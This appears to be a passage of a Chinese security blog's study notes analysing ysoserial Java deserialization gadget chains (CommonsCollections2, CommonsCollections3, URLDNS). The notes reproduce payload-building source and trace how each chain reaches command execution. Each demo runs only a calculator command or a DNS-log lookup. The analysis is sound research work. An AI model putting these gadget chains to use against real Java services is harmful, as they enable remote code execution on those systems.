<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="为什么需要用反射"><a href="#为什么需要用反射" class="headerlink" title="为什么需要用反射"></a>为什么需要用反射</h3><blockquote>
<p>  Java中不是所有对象都⽀持序列化，待序列化的对象和所有它使⽤的内部属性对象，必须都实 现了 java.io.Serializable 接⼝。⽽我们最早传给ConstantTransformer的 是 Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接⼝的，所以不允许被 序列化。                                                                                    ——摘自p神知识星球《java安全漫谈》</p>
</blockquote>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>暂时由于环境问题还没调试，之后分析（</p>
<h2 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h2><p>在调试的过程中可以发现，如果jdk版本过高，反序列化后<code>LazyMap</code>对象会被解释成一个<code>LinkedHashMap</code>对象，使得上面的gadget无法被利用。</p>
<h2 id="另一种方法"><a href="#另一种方法" class="headerlink" title="另一种方法"></a>另一种方法</h2><p>不只是<code>LazyMap</code>可以触发上述点，在<code>TransformedMap</code>中也有类似的操作，有待之后分析。</p>
]]></content>
      <categories>
        <category>JavaWeb</category>
        <category>ysoserial</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections2 分析</title>
    <url>//CommonCollections2.html</url>
    <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>CommonCollections2</code>利用链分析，跟踪调试。</p>
<a id="more"></a>



<h1 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">				...</span></span><br><span class="line"><span class="comment">					TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">						InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">							Method.invoke()</span></span><br><span class="line"><span class="comment">								Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Queue</span>&lt;<span class="title">Object</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">		<span class="comment">// mock method name until armed</span></span><br><span class="line">		<span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">		<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">		<span class="comment">// stub data for replacement later</span></span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch method called by comparator</span></span><br><span class="line">		Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch contents of queue</span></span><br><span class="line">		<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">		queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">		queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> queue;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	    String command[] = &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;;</span><br><span class="line">	    PayloadRunner.run(CommonsCollections2.class, command);</span><br><span class="line"><span class="comment">//		PayloadRunner.run(CommonsCollections2.class, args);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="分析-amp-调试"><a href="#分析-amp-调试" class="headerlink" title="分析&amp;调试"></a>分析&amp;调试</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>这个函数还有待分析，目前只知道他能产生一个<code>Templatesimpl</code>对象，调用其中的<code>newTransformer</code>就会达到<code>Runtime.getRuntime.exec()</code>的作用</p>
<h3 id="InvokeTransformer-java"><a href="#InvokeTransformer-java" class="headerlink" title="InvokeTransformer.java"></a>InvokeTransformer.java</h3><p>在<a href="./CommonCollections1.html">CommonCollections1</a>中已经分析过这个类，其<code>Transform</code>函数的作用是返回一个对象<code>iMethodName</code>函数的调用结果 ，也就是可以执行一次其他函数。</p>
<p>这里就不再冗余的再次分析</p>
<h3 id="PriorityQueue-java"><a href="#PriorityQueue-java" class="headerlink" title="PriorityQueue.java"></a>PriorityQueue.java</h3><p>首先看名字是一个 <strong>优先级队列</strong></p>
<p>队列是一个先入先出的容器，但是在实际的应用过程中往往要求对队列中的元素进行优先级排序，优先级高的先出列</p>
<p>在每一个元素进入队列时，会对队列重新进行排序</p>
<p>这个类提供了一个<code>comparator</code>属性，用于使用自定义的<code>Comparator</code>对象进行比较</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个利用链中用到的是<code>TransformingComparator</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br></pre></td></tr></table></figure>



<h3 id="TransformingComparator-java"><a href="#TransformingComparator-java" class="headerlink" title="TransformingComparator.java"></a>TransformingComparator.java</h3><p>这个类实现了<code>Comparator</code>接口，其中关键的是<code>Compare</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Returns the result of comparing the values from the transform operation.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> obj1  the first object to transform then compare</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> obj2  the second object to transform then compare</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> negative if obj1 is less, positive if greater, zero if equal</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>他会调用自己的<code>transformer</code>的<code>transform</code>方法，而这个<code>transform</code>方法会调用<code>InvokerTransformer.transform</code>方法</p>
<p>而这个方法的内容在构造的时候被写成<code>newTransformer</code>并将第一个元素变成<code>templates</code></p>
<p>这样的话调用<code>InvokerTransformer.transform</code>的时候其实是调用了<code>TemplatesImpl.newTransform</code>达到一个命令执行的作用</p>
<h4 id="为什么不用ChainedTransFormer"><a href="#为什么不用ChainedTransFormer" class="headerlink" title="为什么不用ChainedTransFormer"></a>为什么不用ChainedTransFormer</h4><p>在之前的<code>CommonCollections1</code>中分析过，可以用<code>ChainedTransformer</code>的<code>transform</code>方法来达到getshell的操作</p>
<p>但是这里为什么不这么操作呢</p>
<p>如果使用<code>ChainedTransformer</code>，那么在<code>getObject</code>中的第二次<code>queue.add</code>的时候，会对这个队列重新排序，调用<code>ChainedTransformer.transform</code>方法，当调用到<code>invokerTransformer</code>的时候，这个方法会<code>throw</code>一个<code>InvocationTargetException</code>导致<code>PayloadRunner.run</code>一开始</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] serialized = <span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;<span class="keyword">byte</span>[]&gt;()&#123;</span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">				<span class="keyword">final</span> String command = args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="keyword">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">				System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">				ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">                <span class="keyword">final</span> Object objBefore = payload.getObject(command);</span><br><span class="line"></span><br><span class="line">				System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">				<span class="keyword">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">				Utils.releasePayload(payload, objBefore);</span><br><span class="line">                <span class="keyword">return</span> ser;</span><br><span class="line">		&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>这里的<code>callWrapped</code>捕获到这个异常，从而抛出另一个异常<code>ExecException</code>，导致初始化payload失败</p>
<p>所以<code>ysoserial</code>采用了间接的方法——在构造的时候使用<code>toString</code>方法，而后改写<code>iMethodName</code>。而<code>ChainedTransformer</code>则无法使用这个间接方法。</p>
]]></content>
      <categories>
        <category>JavaWeb</category>
        <category>ysoserial</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections3 分析</title>
    <url>//CommonCollections3.html</url>
    <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>CommonCollections3</code>利用链分析，跟踪调试。</p>
<a id="more"></a>



<h1 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Variation on CommonsCollections1 that uses InstantiateTransformer instead of</span></span><br><span class="line"><span class="comment"> * InvokerTransformer.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>相比<code>CommonCollection1</code>来说，用<code>InstantiateTransformer</code>代替了<code>InvokerTransformer</code></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// inert chain for setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">			<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">		<span class="comment">// real chain for after setup</span></span><br><span class="line">		<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">				<span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">				<span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">						<span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">						<span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	    String command[] = &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;;</span><br><span class="line">	    PayloadRunner.run(CommonsCollections3.class, command);</span><br><span class="line"><span class="comment">//		PayloadRunner.run(CommonsCollections3.class, args);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="分析-amp-调试"><a href="#分析-amp-调试" class="headerlink" title="分析&amp;调试"></a>分析&amp;调试</h2><p>前面的过程和<code>CommomCollections1</code>一样，通过<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法调用<code>LazyMap.get()</code>方法</p>
<p>在<code>LazyMap.get()</code>方法中，掉用了<code>factory.transform</code>方法，从而触发<code>ChainedTransformer</code></p>
<p>之后就产生了些许的不同</p>
<p>在<code>ChainedTransformer</code>中的对象不再是那一串<code>invokerTransformer</code>，而是一个<code>InstantiateTransformer</code></p>
<h4 id="InstantiateTransformer-java"><a href="#InstantiateTransformer-java" class="headerlink" title="InstantiateTransformer.java"></a>InstantiateTransformer.java</h4><p>还是只需要看<code>transform</code>方法就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input Class object to a result by instantiation.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说的简单点就是根据<code>Object input</code>的具有<code>iParamTypes</code>的构造器，以<code>iArgs</code>作为参数，构造一个对象</p>
<p>在这条链中，构造的对象是<code>TrAXFilter</code>，参数类型是<code>Templates</code>，实体参数是由<code>Gadgets.createTemplatesImpl(command)</code>产生的和<code>CommonCollections2</code>一样的一个利用链</p>
<p>只要能够触发<code>TemplatesImpl.newInstance</code>就可以触发<code>Runtime.getRuntime.exec(command)</code></p>
<h3 id="TrAXFilter-java"><a href="#TrAXFilter-java" class="headerlink" title="TrAXFilter.java"></a>TrAXFilter.java</h3><p>继承自<code>XMLFilterImpl</code>，实现的是一个<code>XML过滤器</code></p>
<p>看一下带<code>Template</code>参数的构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第五行调用了<code>templates.newTransformer()</code></p>
<h3 id="TemplatesImpl-java"><a href="#TemplatesImpl-java" class="headerlink" title="TemplatesImpl.java"></a>TemplatesImpl.java</h3><h4 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer"></a>newTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Implements JAXP&#x27;s Templates.newTransformer()</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">                                      _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第11行调用了<code>getTransletInstance</code>方法</p>
<h4 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第10行调用了<code>newInstance</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201212164702722.png" alt="image-20201212164702722"></p>
<p>调试跑到这里的时候<code>_class[_transletIndex]</code>指向的就是生成出来的那一串调用链</p>
<p>于是触发了命令执行</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201212164827793.png" alt="image-20201212164827793"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>JavaWeb</category>
        <category>ysoserial</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS 分析</title>
    <url>//URLDNS.html</url>
    <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>URLDNS.java</code>利用链分析，跟踪调试。</p>
<p><strong>参考p神知识星球中的文章（p神博客里也有）</strong></p>
<a id="more"></a>



<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>先来看看<code>ysoserial</code>对这个gadget的注释</p>
<h3 id="漏洞点，效果"><a href="#漏洞点，效果" class="headerlink" title="漏洞点，效果"></a>漏洞点，效果</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>在第二行写到触发漏洞的方法为<code>URL.hashCode()</code></p>
<p>第三行写到，这个gadget的会产生的效果是进行一次<code>dns lookup(域名解析)</code>，这个利用链在目标<strong>能够出网的情况下</strong>可以使用。</p>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>在注释里面，利用链的调用栈写的很清楚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>之后调试的时候，可以在这些地方分别下断点（也可以直接在<code>URL.hashCode()</code>处下断点）然后调试分析。</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url);</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// write by my self</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">            <span class="comment">//    PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">            